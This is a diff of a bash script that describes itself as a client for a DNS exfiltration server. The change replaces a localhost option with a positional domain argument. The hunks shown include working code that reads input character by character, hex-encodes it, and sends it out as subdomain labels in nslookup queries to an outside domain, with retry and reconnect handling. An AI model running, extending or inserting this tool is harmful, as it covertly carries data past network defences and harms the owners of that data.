@@ -1,8 +1,9 @@
 #!/bin/bash
 # Send data to DNS exfiltration server.
 # Usage: command [-options] domain
+# Positional Arguments:
+#   domain: the domain to send data to
 # Options:
-#   -l: localhost
 #   -n: number of characters to store before sending a packet
 
 # check if there are arguments supplied
@@ -14,16 +15,17 @@ fi
 # set globals
 local_server=""
 char_queue=5
+domain=""
 
 # check command line options
 while [ $# -gt 0 ]; do
   # check if server is on localhost
-  if [ $1 = "-l" ]; then
-    local_server="127.0.0.1"
-  elif [ $1 = "-n" ]; then
+  if [ $1 = "-n" ]; then
     char_queue=$2
+    shift
   else
-    # if it isn't an option, break out of the loop
+    # if it isn't an option, must be a positional argument
+    domain="$1"
     break
   fi
   shift
@@ -35,7 +37,7 @@ if [ $# -eq 0 ]; then
 fi
 
 # start connection
-ns_out=$(nslookup -query=A $1 $local_server)
+ns_out=$(nslookup -query=A $domain $local_server)
 # stop if failed
 if [ $? -eq 1 ]; then
   echo "Connection failed."
@@ -58,7 +60,7 @@ while read -rsN1 letter; do
     # turn letters to hex
     data=$(echo "$letters" | xxd -ps -c 200 | tr -d '\n' | head -c -2)
     # format into encoding
-    encoded="$packet_number.$connection_id.$data.$1"
+    encoded="$packet_number.$connection_id.$data.$domain"
 
     retries=0
 
@@ -73,7 +75,7 @@ while read -rsN1 letter; do
         echo "Malformed request sent."
       elif [ $response_code = "REFUSED" ]; then
         # start connection
-        ns_out=$(nslookup -query=A $1 $local_server)
+        ns_out=$(nslookup -query=A $domain $local_server)
         # set new connection id on success
         if [ $? -eq 0 ]; then
           # get connection id based on nslookup output
